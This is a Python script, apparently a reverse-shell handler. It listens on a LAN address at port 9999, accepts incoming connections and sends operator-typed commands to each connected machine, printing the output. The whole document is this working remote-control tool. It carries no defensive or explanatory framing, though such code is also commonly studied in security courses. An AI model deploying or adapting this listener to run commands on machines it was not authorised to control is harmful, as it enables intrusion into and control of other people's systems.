#!/usr/bin/env python3

import socket
import sys
import os
import threading

def main() :
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    server.bind(("192.168.15.29",9999))
    server.listen(5)
    
    while True :
        
        client,addr = server.accept()
        
        print("[*] Received connection from :",addr[0],addr[1])
        
        client_handle = threading.Thread(target = handle_client,args=(client,))
        client_handle.start()
        
def handle_client(client_socket) :
    while True :
    
        result1 = result(client_socket)
        print(result1, end = "")
        
        command = input() + "\n"
        client_socket.send(command.encode())
        
        result1 = result(client_socket)
        print(result1)         
        

def result(client) :
    recv_len = 1
    bufferd = ""
    while True :
        data = (client.recv(4096)).decode()
        bufferd += data
        if len(data) < 4096 :
            break
        
    return bufferd


main()
